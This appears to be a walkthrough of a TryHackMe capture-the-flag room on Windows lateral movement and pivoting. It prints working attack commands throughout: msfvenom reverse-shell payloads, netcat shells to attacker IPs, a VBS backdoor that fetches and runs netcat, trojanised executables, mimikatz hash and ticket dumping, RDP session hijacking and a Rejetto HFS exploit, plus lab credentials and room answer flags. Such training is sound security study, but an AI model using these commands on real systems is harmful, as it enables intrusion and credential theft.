![image](https://github.com/user-attachments/assets/1391962a-d763-4261-9809-b61707c31bc1)


# Lateral Movement and Pivoting
   Learn about common techniques used to move laterally across a Windows network.
   

TryHackMe room [link](https://tryhackme.com/room/lateralmovementandpivoting)

<br>

## Task 1 : Introduction

> Key Objectives

- Learn **lateral movement techniques** used by attackers to navigate networks stealthily.
- Use stolen **credentials/authentication** material to move between systems.
- **Pivot** through compromised hosts to access restricted segments.




> Network Setup Guide


![image](https://github.com/user-attachments/assets/45d018bf-624d-4239-87a9-8945586aa440)


1. DNS Configuration (Critical for AD)

   > Attack Machine:

        sed -i '1s|^|nameserver 10.200.124.101\n|' /etc/resolv-dnsmasq
   
      And to verify the connection run..

       nslookup thmdc.za.tryhackme.com
   
     Set DNS to THMDC’s IP in Network Manager.


3. VPN Connection (For Personal Machines)

       sudo openvpn user-lateralmovementandpivoting.ovpn

Verify connection on the access page (green tick).

3. Note Your Attacker IP

        ifconfig                   

We will be using this IP for reverse shells/payloads..




> Initial Access

**1. Get Credentials:**

   For getting the credentials we need to visit:
   

        http://distributor.za.tryhackme.com/creds

   
   The we need to click `Get Credentials`. and we will get the credentials i.e. `rachael.atkinson` and 	`Zjqf3489`..

![image](https://github.com/user-attachments/assets/55fb2b5f-9219-45d5-84b6-484bc48649e9)




**2. SSH into Jump Host (THMJMP2):**


        ssh za\\rachael.atkinson@thmjmp2.za.tryhackme.com

   
This simulates a breached foothold.

![image](https://github.com/user-attachments/assets/3013f564-0579-4f8b-9cc0-7aa769a4e892)






<br>


## Task 2 : Moving Through the Network

![image](https://github.com/user-attachments/assets/8e7a6c99-01e0-4620-9ce3-dd8e36a7bd69)

> What is Lateral Movement?

- **Definition:** Techniques attackers use to navigate a network after initial compromise.
- **Purpose:**
   - Bypass network restrictions (e.g., `firewalls`).
   - Access high-value targets (e.g., `databases`, `code repos`).
   - Establish persistence and evade detection.



> The Lateral Movement Cycle

- Compromise a host (e.g., via phishing).
- Elevate privileges (e.g., local admin → domain admin).
- Extract credentials (hashes, tickets, tokens).
- Repeat to move to new hosts.

![image](https://github.com/user-attachments/assets/25647e25-2ef9-46d6-8077-9477f92bf853)




> Common Lateral Movement Methods

- Standard Protocols (Visible but blends in):
   - RDP/WinRM/SSH: Mimic normal user behavior.
   - Caution: Avoid illogical connections (e.g., local admin from Marketing to DEV-PC).
     
- Stealthier Techniques (Harder to detect):
   - Pass-the-Hash, Overpass-the-Hash.
   - Token impersonation, Kerberos attacks.




> Example..

![image](https://github.com/user-attachments/assets/c0514de9-5017-480b-9841-6d88ba117db2)





> UAC & Administrator Accounts

- Local Admins:
   - Restricted by UAC (except default Administrator account).
   - Cannot perform remote admin tasks via RPC/SMB/WinRM (only via RDP).
- Domain Admins:
   - Full privileges remotely (no UAC restrictions).
- Workaround: Disable UAC (if possible) or use domain accounts.



<br>


## Task 3 : Spawning Processes Remotely

  This task will look at the available methods an attacker has to spawn a process remotely, 
allowing them to run commands on machines where they have valid credentials. Each of 
the techniques discussed uses slightly different ways to achieve the same purpose, and some 
of them might be a better fit for some specific scenarios.

###  1. Psexec
- **Port:** TCP 445 (`SMB`)
- **Group:** Administrators
- How it **works?**
      - Connects to `Admin$` share and uploads psexesvc.exe.
      - Creates a remote service (`PSEXESVC`) to run the command.
      - Uses named pipes for `stdin/stdout/stderr`.

**Command:**
      
      psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe

      
 `Psexec` is one of many `Sysinternals` Tools and can be downloaded 
[link](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec)


![image](https://github.com/user-attachments/assets/e0352dc3-2edc-4871-b06d-489006df255e)



###  2. Windows Remote Management (WinRM)
- **Ports:** TCP 5985 (`HTTP`), 5986 (`HTTPS`)
- **Group:** Remote Management Users
- How it **works**?
        - Uses PowerShell or winrs to execute commands over WinRM.

Command:

      winrs.exe -u:Administrator -p:Mypass123 -r:target cmd

**PowerShell**:
            
      $cred = New-Object System.Management.Automation.PSCredential ("Administrator", (ConvertTo-SecureString "Mypass123" -AsPlainText -Force))

      Enter-PSSession -Computername TARGET -Credential $cred
         
      Invoke-Command -Computername TARGET -Credential $cred -ScriptBlock { whoami }



### 3. Remote Service Creation (sc.exe)
- **Ports:** TCP 135 (`EPM`), 49152–65535 (`DCE`/`RPC` dynamic), 445/139 (`SMB` Named Pipes)
- **Group:** Administrators
- How it works?
      - Creates and starts a service on the target.
      - Executes the given command via service.

Command:
   
      sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
      sc.exe \\TARGET start THMservice
      sc.exe \\TARGET stop THMservice
      sc.exe \\TARGET delete THMservice
      
### 4. Scheduled Task Creation (schtasks)
- **Tool:** `schtasks` (standard on Windows)
- How it **works**?
      - Creates a task set to `run once`.
      - Runs the task manually to trigger the payload.

Command:


      schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<payload>" /sc ONCE /sd 01/01/1970 /st 00:00
      schtasks /s TARGET /run /TN "THMtask1"
      schtasks /s TARGET /TN "THMtask1" /DELETE /F




<br>

## Let's Get to Lab work!!

### 1: Generate the Payload

- On your Attack machine (Kali Linux or anyother), generate the service payload:


      msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=[IP] LPORT=4444 -o myservice.exe
  
> Replace **[IP]** with your Attack machine's IP (you can find this with ip a).

![image](https://github.com/user-attachments/assets/242343c4-0c31-48e9-b011-6562ff309ebf)



### 2: Upload the Payload
- Upload the payload to `THMIIS` using SMB:


      smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever

![image](https://github.com/user-attachments/assets/54700466-5442-48e6-a5d4-3ad5b51c6eed)

  
### 3: Set Up Listener
- Start a `Metasploit` listener:

      msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST [IP]; set LPORT 4444;exploit"

![image](https://github.com/user-attachments/assets/dba2dedc-889b-4e5b-9990-af7e771a744a)


### 4: Create Reverse Shell with Admin Creds
- On `THMJMP2` (via your `SSH` session), run:

        runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe [IP] 4443"

When prompted, enter the password: `EZpass4ever`
![image](https://github.com/user-attachments/assets/9846a75e-de17-44a7-99f1-59efc8e6a67f)



### 5: Set Up Netcat Listener
- In a new terminal on your Attacker machine:

      nc -lvp 4443
![image](https://github.com/user-attachments/assets/488462c0-764a-4d43-a0de-52588dadb208)

  
### 6: Create and Start Service
- In the new command prompt you get from the netcat connection (which now has `t1_leonard.summers` token), run:

      sc.exe \\thmiis.za.tryhackme.com create THMservice-[UNIQUE_ID] binPath= "%windir%\myservice.exe" start= auto
      sc.exe \\thmiis.za.tryhackme.com start THMservice-[UNIQUE_ID]
  
Replace `UNIQUE_ID` with a unique number to avoid conflicts.

![image](https://github.com/user-attachments/assets/0bf3a930-b3a9-4b4d-8ff1-cbd733df3dbd)


### 7: Get Shell and Flag
- You can get a shell in your `Metasploit` listener.
- **Navigate** to the desktop: `cd C:\Users\t1_leonard.summers\Desktop`
- Run the **flag**: `flag.exe`

The flag will be displayed
![image](https://github.com/user-attachments/assets/a7afdbea-b358-416c-ae85-ca07720e9b57)



## **_Answers_**

After running the "flag.exe" file on t1_leonard.summers desktop on THMIIS, what is the flag?

         THM{MOVING_WITH_SERVICES}





<br>


## Task 4 : Moving Laterally Using WMI

   `WMI` is a powerful Windows management tool that attackers can abuse for lateral movement. Below are key techniques:

### 1. Establishing a WMI Session
   - **Requirements:** Admin privileges.
   - **Protocols:**
      - **DCOM:** Uses `RPC` over `IP` (ports 135/TCP + 49152-65535/TCP).
      - **Wsman:** Uses `WinRM` (ports 5985/TCP HTTP or 5986/TCP HTTPS).

> PowerShell Setup:

      $credential = New-Object System.Management.Automation.PSCredential "Administrator", (ConvertTo-SecureString "Mypass123" -AsPlainText -Force)
      $Opt = New-CimSessionOption -Protocol DCOM  
      $Session = New-CimSession -ComputerName TARGET -Credential $credential -SessionOption $Opt  

      
### 2. Remote Process Creation
- **Method:** Spawn processes silently via Win32_Process.
   > PowerShell:
   
              Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="powershell.exe -c 'Set-Content C:\text.txt munrawashere'"}  
   
   > Legacy (WMIC):
   
         wmic /user:Admin /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe"  
      
### 3. Creating & Controlling Services
- **Method:** Abuse Win32_Service to create/start malicious services.

   > PowerShell:
   
         # Create service  
         Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{  
        Name="THMService2"; DisplayName="THMService2";  
        PathName="net user hacker Pass123 /add";  
        ServiceType=16; StartMode="Manual"  
         }  
         
         # Start service  
         $Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -Filter "Name='THMService2'"  
         Invoke-CimMethod -InputObject $Service -MethodName StartService  
      
### 4. Scheduled Tasks Execution
- **Method:** Create/trigger tasks via WMI.

   > PowerShell:
         
         $Action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c net user hacker2 Pass123 /add"  
         Register-ScheduledTask -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"  
         Start-ScheduledTask -TaskName "THMtask2"  
         # Cleanup  
         Unregister-ScheduledTask -TaskName "THMtask2"  
         
### 5. MSI Package Installation
- **Method:** Use Win32_Product to install malicious MSI files.

   > PowerShell:
   
   
         Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{  
           PackageLocation="C:\Windows\evil.msi"; AllUsers=$false  
         }  
   
   > Legacy (WMIC):
   
         wmic /node:TARGET /user:Admin product call install PackageLocation=c:\Windows\evil.msi  

<br>

## Let's Get to Lab work!!

### 1: Generate the MSI Payload
- On your AttackBox, generate the MSI payload:

         msfvenom -p windows/x64/shell_reverse_tcp LHOST=[YOUR_ATTACKBOX_IP] LPORT=4445 -f msi > myinstaller.msi
  
Replace [YOUR_ATTACKBOX_IP] with your AttackBox's IP (use ip a to find it).

![image](https://github.com/user-attachments/assets/9432065b-eb6b-48fa-bc5f-077d436cec0c)


### 2: Upload the Payload
- Upload the MSI to THMIIS using SMB:

         smbclient -c 'put myinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994

![image](https://github.com/user-attachments/assets/701a0f06-eb41-42c0-9d63-32e89c7af16f)
  

### 3: Set Up Listener
- Start a Metasploit listener:

         msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST [YOUR_ATTACKBOX_IP]; set LPORT 4445;exploit"

![image](https://github.com/user-attachments/assets/83bc5113-978b-40a1-ba27-04d7a943acc3)


### 4: Establish WMI Session

- On THMJMP2 (via your SSH session), open PowerShell and run:
      

      $username = 't1_corine.waters';
      $password = 'Korine.1994';
      $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
      $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
      $Opt = New-CimSessionOption -Protocol DCOM
      $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop

    If we are in cmd prompt, we need to switch to powershell by using command in the cmd of the ssh..

        powershell

![image](https://github.com/user-attachments/assets/f7ae5a76-8f3b-4f8f-a26b-aba1e20fb5b5)


### 5: Trigger the Payload
- In the same PowerShell session, execute:

      Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}

![image](https://github.com/user-attachments/assets/12ee1ad3-e326-44b2-8fce-f715a3357a1f)


### 6: Get Shell and Flag
- You should get a shell in your Metasploit listener
- Navigate to the desktop: cd C:\Users\t1_corine.waters\Desktop
- Run the flag: flag.exe

The flag will be displayed...

![image](https://github.com/user-attachments/assets/3da4ecfc-ebf1-4cb6-9785-1361dbf90894)


## **_Answers_**

After running the "flag.exe" file on t1_leonard.summers desktop on THMIIS, what is the flag?

         THM{MOVING_WITH_WMI_4_FUN}



<br>


## Task 5 : Use of Alternate Authentication Material
   
   Attackers can bypass password requirements by leveraging NTLM hashes or Kerberos tickets for authentication. Below are key techniques:



### 1. NTLM Authentication & Pass-the-Hash (PtH)
> How NTLM Works
   - Client sends authentication request.
   - Server sends a challenge.
   - Client responds with an NTLM hash-derived answer.
   - Server verifies with the Domain Controller (DC).

> Pass-the-Hash (PtH) Attack
   - **What it does? ** Authenticate using only the NTLM hash (no plaintext password needed).
   - **Requirements:**
   - NTLM authentication must be enabled.
   - Admin privileges to extract hashes.

> Extracting NTLM Hashes
   - From Local SAM (local users only):
   
         mimikatz # privilege::debug  
         mimikatz # token::elevate  
         mimikatz # lsadump::sam
     
   - From LSASS (includes domain users):
   
         mimikatz # sekurlsa::msv  

> Executing PtH
- Using Mimikatz (Windows):

      mimikatz # sekurlsa::pth /user:Bob /domain:za.tryhackme.com /ntlm:HASH /run:"nc64.exe -e cmd.exe ATTACKER_IP 5555"  

-  Using Linux Tools:
   - RDP: xfreerdp /v:IP /u:User /pth:HASH
   - PsExec: psexec.py -hashes HASH DOMAIN/User@IP
   - WinRM: evil-winrm -i IP -u User -H HASH

### 2. Kerberos Authentication & Attacks
> How Kerberos Works
   - User requests a TGT (Ticket Granting Ticket) from the KDC (Key Distribution Center).
   - KDC sends an encrypted TGT (using krbtgt account hash) and a Session Key.
   - User requests a TGS (Ticket Granting Service) for a specific service (e.g., SMB, HTTP).
   - Service decrypts the TGS using its Service Owner Hash and grants access.

> Pass-the-Ticket (PtT)
   - What it does: Steal and reuse Kerberos tickets (TGT/TGS) from memory.
   - Requirements:
   - TGT extraction requires admin rights.
   - TGS extraction works with low privileges.

> Extracting Tickets

      mimikatz # privilege::debug  
      mimikatz # sekurlsa::tickets /export  
      
> Injecting Tickets

      mimikatz # kerberos::ptt Administrator.kirbi  
   - Verify with klist.

### 3. Overpass-the-Hash / Pass-the-Key (PtK)
> What it does:
   - Request a Kerberos TGT using an AES/RC4 key (derived from password).
   - RC4 = NTLM hash, so Overpass-the-Hash (OPtH) is possible if RC4 is enabled.

> Extracting Kerberos Keys

      mimikatz # sekurlsa::ekeys  

> Executing PtK
- Using RC4 (NTLM hash):

      mimikatz # sekurlsa::pth /user:Admin /domain:za.tryhackme.com /rc4:HASH /run:"nc64.exe -e cmd.exe ATTACKER_IP 5556"  

- Using AES128/AES256:

      mimikatz # sekurlsa::pth /user:Admin /domain:za.tryhackme.com /aes256:KEY /run:"..."  


## Let's Get to Lab work!!

### 1: Connect to THMJMP2
- First, connect to the jump server using SSH:

      ssh za\\t2_felicia.dean@thmjmp2.za.tryhackme.com
  
Password: `iLov3THM!`

![image](https://github.com/user-attachments/assets/55bed469-6b32-483d-9340-18e06b1061a8)


### 2: Extract NTLM Hashes with Mimikatz
- On `THMJMP2`, open `mimikatz`:

      C:\tools\mimikatz.exe
![image](https://github.com/user-attachments/assets/c172eb23-7520-4f4b-b0d9-f965a119a0e4)


- In mimikatz, run these commands:

      privilege::debug
      token::elevate
      sekurlsa::msv
  
This will display NTLM hashes for logged-in users. Look for `t1_toby.beck`'s hash.
![image](https://github.com/user-attachments/assets/980ce2a9-6955-437d-ae27-59208a5f4e70)


### 3: Perform Pass-the-Hash Attack
- Using the extracted hash, perform PtH:

      token::revert

- I setup the netcat listner, and then wait for the trigger..

      nc -lvnp 5555
      sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:533f1bd576caa912bdb9da284bbc60fe /run:"c:\tools\nc64.exe -e cmd.exe 10.50.77.72 5555"

![image](https://github.com/user-attachments/assets/c4cca64d-7114-4add-bf97-eb74a03d3ce7)
![image](https://github.com/user-attachments/assets/9ecd6934-dcaa-499a-b5cf-5e65a4a97b1f)



### 4: Connect to THMIIS
- In the new command prompt window that opens (which now has `t1_toby.beck`'s token), connect to `THMIIS`:

      winrs.exe -r:THMIIS.za.tryhackme.com cmd

![image](https://github.com/user-attachments/assets/c382f340-fb44-4145-98b9-ab9f290a285c)


  
### 5: Get the Flag
- In the new remote shell on THMIIS:

      cd C:\Users\t1_toby.beck\Desktop
      Flag.exe
  
The flag will be displayed..

![image](https://github.com/user-attachments/assets/84ca9158-3b16-4e46-b4f1-75f9a54f1fbd)


## **_Answers_**

What is the flag obtained from executing "flag.exe" on t1_toby.beck's desktop on THMIIS?

         THM{NO_PASSWORD_NEEDED}


<br>

## Task 6 : Abusing User Behaviour
   
   Attackers can exploit common user actions to gain unauthorized access. Below are key techniques:

### 1. Abusing Writable Shares

> Scenario

   - Users access shared scripts/executables (e.g., `.vbs`, `.exe`) from a network share.
   - If the share is writable, attackers can backdoor these files.

> Methods
   - Backdooring `.vbs` Scripts
   
       - Inject malicious code to download & execute a payload:

               CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\ATTACKER_IP\share\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe ATTACKER_IP 1234", 0, True

        - When the user runs the script, it silently spawns a reverse shell.

   - Backdooring `.exe` Files
     
      - Use msfvenom to inject a payload into a legitimate executable (e.g., putty.exe):
     
                 msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -b "\x00" -f exe -o puttyX.exe

       - Replace the original file on the share.
       - When users run it, they execute the backdoor unknowingly.

### 2. RDP Hijacking (Session Stealing)

> Scenario

- Admins sometimes disconnect (without logging off) from RDP sessions.
- These sessions remain active and can be hijacked.

> Exploitation..

- Gain SYSTEM privileges (e.g., via PsExec):

      PsExec64.exe -s cmd.exe
  
- List active sessions:

      query user
  
   - Look for `Disc` (disconnected) sessions.

- Take over a session:

        tscon SESSION_ID /dest:CURRENT_SESSION_NAME
  
   -  Example: `tscon 3 /dest:rdp-tcp#6` hijacks session 3 and attaches it to your session.

> Limitations

- Works on `Windows Server 2016` and earlier.
- `Windows Server 2019+` requires the user's password for session takeover.







## Let's Get to Lab work!!
### 1: Get Credentials
   - Visit http://distributor.za.tryhackme.com/creds_t2 to get your RDP credentials

Note down the username and password provided
![image](https://github.com/user-attachments/assets/e6f4c9ff-0e7b-4f4b-840b-d59d22a4e5ce)


### 2: Connect to THMJMP2 via RDP
- From your AttackBox, run:

      xfreerdp3 /v:thmjmp2.za.tryhackme.com /u:t2_eric.harding /p:Kegq4384

### 3: Gain SYSTEM Privileges
- Once logged in, open Command Prompt as Administrator
- Navigate to C:\tools\ and run:

      C:\tools\PsExec64.exe -s cmd.exe
      
This will open a new command prompt with SYSTEM privileges.

![image](https://github.com/user-attachments/assets/e2a66b82-efd6-4f41-b884-ca10bea8b035)


### 4: Find Disconnected Sessions
   - In the new SYSTEM command prompt, run:

         query user
      
Look for t1_toby.beck sessions marked as "Disc" (Disconnected). Note the session ID ( i.e. 4)

![image](https://github.com/user-attachments/assets/23f52731-082e-447b-9a69-8a11e78ec06e)


### 5: Hijack the Session

   - Note your current SESSIONNAME (shown in query user output, likely "rdp-tcp#X")

![image](https://github.com/user-attachments/assets/d78d4b52-603d-472e-b775-28cde4383997)

So, we can identify for active user is 82..

   - Run the hijack command:

         tscon 4 /dest:rdp-tcp#82

This will prompt a new windows. where we can find the flag..

### 6: Access the Flag
This will open `paint.exe` where we can find the flag..

![image](https://github.com/user-attachments/assets/c84452be-8657-418b-9c29-cf74afa82e95)



## **_Answers_**

What flag did you get from hijacking `t1_toby.beck`'s session on THMJMP2?

         THM{NICE_WALLPAPER}




<br>

## Task 7 : Port Forwarding

   When direct access to target ports is blocked, attackers use port forwarding to pivot through compromised hosts. Below are key techniques:

### 1. SSH Tunneling

- Remote Port Forwarding
   - **Use Case:** Access a restricted port (e.g., `RDP 3389`) on an internal server via a compromised host.
     
   - **Command:**
     
         ssh tunneluser@ATTACKER_IP -R 3389:TARGET_IP:3389 -N
     
       - Opens port 3389 on the attacker’s machine, forwarding traffic to the target.

    - **Example:**

           xfreerdp /v:127.0.0.1 /u:Admin /p:Pass123  # Connect via localhost
      
- Local Port Forwarding
   - **Use Case:** Expose an attacker’s service (e.g., `HTTP 80`) to an internal network.
   
   - **Command:**

            ssh tunneluser@ATTACKER_IP -L *:80:127.0.0.1:80 -N
        - Hosts in the internal network can now access http://PIVOT_IP:80.

   - **Firewall Rule (if needed):**

         netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80

     
### 2. Port Forwarding with socat

   - **Use Case:** Forward ports when `SSH` is unavailable.
   
   - Basic Syntax:
     
            socat TCP4-LISTEN:LOCAL_PORT,fork TCP4:TARGET_IP:TARGET_PORT
     
   - Examples:
      - Forward RDP (`3389`):
      
               socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389
     
      - Expose Attacker’s HTTP (`80`):
      
               socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80
     
   - **Firewall Rule:**
   
            netsh advfirewall firewall add rule name="Open Port X" dir=in action=allow protocol=TCP localport=X


### 3. Dynamic Port Forwarding (SOCKS Proxy)

- **Use Case:** Pivot through a host to scan multiple ports/IPs.

- `SSH` SOCKS Proxy Setup:

         ssh tunneluser@ATTACKER_IP -R 9050 -N

     - Creates a SOCKS proxy on port 9050.

 - Using proxychains:

         proxychains curl http://internal.target
         proxychains nmap -sT -Pn TARGET_IP  # Works with TCP scans
   
     - Configure `/etc/proxychains.conf`:

               ini
               socks4 127.0.0.1 9050





## Let's Get to Lab work!!

> Flag 1: From t1_thomas.moore's Desktop on THMIIS

### Connect to THMJMP2 via SSH:
   As we found the credentials i.e. `rachael.atkinson` and 	`Zjqf3489`, using the Credential [link](http://distributor.za.tryhackme.com/creds)

      ssh za\\rachael.atkinson@thmjmp2.za.tryhackme.com

      
### Set up socat port forward (on `THMJMP2`):

      C:\tools\socat\socat TCP4-LISTEN:13389,fork TCP4:THMIIS.za.tryhackme.com:3389

![image](https://github.com/user-attachments/assets/b6611bae-8c06-482b-a19b-cce1bd9f5b1c)

### From your attacker machine, connect via `RDP`:

      xfreerdp3 /v:THMJMP2.za.tryhackme.com:13389 /u:t1_thomas.moore /p:MyPazzw3rd2020

![image](https://github.com/user-attachments/assets/c0133e4b-5a70-4a07-8820-1ab7cbe143c6)

      
### Get the flag:
   Once logged in, we can find the `Flag.bat` file in the desktop directory. So double-clicking on it we can find the flag..
   
![image](https://github.com/user-attachments/assets/c004e3f9-bd27-40aa-89c6-e51bf7dd3967)


> Flag 2: From THMDC via Rejetto HFS Exploit
### Set up SSH tunnel from THMJMP2:

      ssh <Attacker_Name>@<Attacker_IP> -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7878:127.0.0.1:7878 -N

If you are having issues, we need to start the ssh services in our attack machine..

         sudo service ssh start
   
   We can verify if the ssh is running fine or not..
   
         sudo service ssh status

![image](https://github.com/user-attachments/assets/a32bb66c-8456-45b1-ab90-d4a70d3a84a6)

I created a new user named  TunnelUser on Attacker machine..
         
         sudo useradd -m tunneluser
         sudo passwd tunneluser
      
![image](https://github.com/user-attachments/assets/575e68f6-4447-4763-b123-2677e884dedf)


### Configure and run Metasploit:

      msfconsole
      use exploit/windows/http/rejetto_hfs_exec
      set payload windows/shell_reverse_tcp
      set lhost thmjmp2.za.tryhackme.com
      set ReverseListenerBindAddress 127.0.0.1
      set lport 7878
      set srvhost 127.0.0.1
      set srvport 6666
      set rhosts 127.0.0.1
      set rport 8888
      exploit

After running the these commands, I got the shell...

![image](https://github.com/user-attachments/assets/32c9983d-8ea3-48f4-9906-856c3dfcc071)



### Get the flag:
   After getting a shell, run:

      type C:\hfs\flag.txt

![image](https://github.com/user-attachments/assets/1629957f-4c7d-4425-aa9b-7807e8fcc691)


This will display the second flag.

## **_Answers_**

 What is the flag obtained from executing "flag.exe" on `t1_thomas.moore`'s desktop on THMIIS?

         THM{SIGHT_BEYOND_SIGHT}

What is the flag obtained using the Rejetto HFS exploit on THMDC?

         THM{FORWARDING_IT_ALL}

<br>

## Task 8 : Conclusion
   This room covered multiple methods attackers use to move laterally across a network after obtaining initial access. The key techniques include:

### 1. WMI (Windows Management Instrumentation)
- Use Cases: Remote process execution, service creation, scheduled tasks, MSI installation.
- Requirements: Admin rights, access over DCOM (135/TCP + high ports) or WinRM (5985/5986 TCP).

### 2. Alternate Authentication Material
- Pass-the-Hash (PtH): Authenticate using NTLM hashes without plaintext passwords.
- Pass-the-Ticket (PtT): Steal and reuse Kerberos tickets (TGT/TGS).
- Overpass-the-Hash (PtK): Convert NTLM hashes into Kerberos tickets.

### 3. Abusing User Behavior
- Backdooring Shared Files: Modify .vbs/.exe files on writable shares.
- RDP Hijacking: Take over disconnected sessions (Windows ≤ 2016).

### 4. Port Forwarding & Pivoting
- SSH Tunneling:
   - Remote Forwarding: Access blocked ports (e.g., ssh -R 3389:TARGET:3389).
   - Local Forwarding: Expose attacker services internally (e.g., ssh -L *:80:127.0.0.1:80).

- socat Forwarding: Alternative when SSH is unavailable.
- Dynamic Forwarding (SOCKS): Use proxychains for flexible scanning.
